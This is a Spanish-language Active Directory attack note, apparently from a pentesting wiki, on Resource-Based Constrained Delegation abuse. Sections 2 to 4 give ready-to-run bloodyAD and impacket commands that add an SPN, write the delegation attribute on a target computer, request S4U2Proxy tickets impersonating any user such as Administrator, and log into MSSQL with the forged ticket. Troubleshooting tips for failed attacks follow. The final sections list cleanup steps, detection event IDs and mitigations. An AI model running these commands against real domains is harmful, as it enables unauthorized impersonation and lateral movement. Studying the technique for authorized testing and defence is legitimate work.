---
title: RBCD — delegación restringida y S4U2Proxy
tags: [windows, active-directory, rbcd, kerberos, lateral-movement]
---

# RBCD: escribir en el equipo y delegar con S4U2Proxy

[🇬🇧 English](rbcd-s4u2proxy.en.md) | **Español**

## 1. La primitiva

*Resource-Based Constrained Delegation* se configura en el **objeto del recurso**, no en la cuenta que delega: el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` del equipo destino contiene un descriptor con los SIDs autorizados a delegar contra él.

Si tienes `GenericAll` o `WriteProperty` sobre el objeto del equipo (o sobre su OU), puedes escribir ese atributo y hacer que una cuenta que controlas (con SPN) pida un ticket **como cualquier usuario** contra ese equipo. No hace falta ser admin del dominio ni tener `SeEnableDelegationPrivilege`: es la diferencia con la delegación clásica.

## 2. Requisitos

- **Escritura** sobre el objeto del equipo destino (`DC2$`, `WS01$`...).
- Una cuenta controlada **con SPN**: `svc_sql`, una cuenta de máquina (`addcomputer.py`) o un usuario al que se le pueda añadir uno.
- Credenciales de esa cuenta y un KDC alcanzable.

Añadir el SPN si falta:

```bash
bloodyAD -u '<user>' -p '<password>' -d '<domain>' --host <DC_IP> set object 'CN=<svc>,CN=Users,DC=<domain>,DC=<tld>' servicePrincipalName -v 'mssqlsvc/<host>.<domain>'
```

## 3. Escribir el atributo

```bash
impacket-rbcd -delegate-from '<svc>' -delegate-to '<TARGET>$' -action write \
  -dc-ip <DC_IP> '<domain>/<user>:<password>'
```

Con `bloodyAD`:

```bash
bloodyAD -u '<user>' -p '<password>' -d '<domain>' --host <DC_IP> add rbcd '<TARGET>$' '<svc>'
```

Comprobar:

```bash
bloodyAD -u '<user>' -p '<password>' -d '<domain>' --host <DC_IP> get object 'CN=<TARGET>,OU=Domain Controllers,DC=<domain>,DC=<tld>' --attr msDS-AllowedToActOnBehalfOfOtherIdentity
```

## 4. Pedir el ticket como otro usuario

```bash
impacket-getST -spn 'mssqlsvc/<host>.<domain>' -impersonate '<victima>' -dc-ip <DC_IP> \
  '<domain>/<svc>:<password>'
export KRB5CCNAME='<victima>@mssqlsvc_<host>.<domain>@<DOMAIN>.ccache'
impacket-mssqlclient -k -no-pass '<host>.<domain>'
```

El SPN debe existir en el KDC y corresponder al servicio que vas a usar. `-impersonate` puede ser `Administrator`, una cuenta de servicio o cualquier usuario cuyo SID el KDC pueda resolver.

## 5. Errores típicos

- **`KDC_ERR_BADOPTION`** → la cuenta que delega no tiene SPN, o el atributo no llegó a replicarse. Espera unos segundos y reintenta; comprueba el SPN con `setspn -L`.
- **`The target account is not allowed to delegate`** → escribiste el atributo en otro objeto o el destino es un DC y el SPN apunta a un servicio que no está en él.
- **`KRB_AP_ERR_SKEW`** → reloj; ver [reloj y Kerberos](../general/kerberos-clock.md).
- **`STATUS_NOT_SUPPORTED`** al escribir → el objeto es de sistema; necesitas `WriteProperty` delegado, no solo `GenericAll` heredado.
- **Ticket válido pero sin acceso** → el servicio comprueba grupo o IP; el ticket da identidad, no permisos de aplicación.

## 6. Limpieza

Vacía `msDS-AllowedToActOnBehalfOfOtherIdentity` en el equipo y retira el SPN añadido:

```bash
impacket-rbcd -delegate-from '<svc>' -delegate-to '<TARGET>$' -action clear -dc-ip <DC_IP> '<domain>/<user>:<password>'
```

## 7. Detección y mitigación

- **5136** sobre `msDS-AllowedToActOnBehalfOfOtherIdentity`, sobre todo si lo escribe una cuenta que no es admin del sistema.
- **4769** con `S4U2Proxy` y un `ServiceName` distinto del habitual para esa cuenta.
- **4624** tipo 3 en el destino con un usuario que nunca se conecta allí.
- Revisar `WriteProperty`/`GenericAll` sobre objetos de equipo y OU; los equipos no deberían poder escribir en otros equipos.
- Marcar cuentas de servicio como «sensible y no delegable» y auditar SPNs añadidos.

MITRE: T1550.003, T1134.001, T1558.
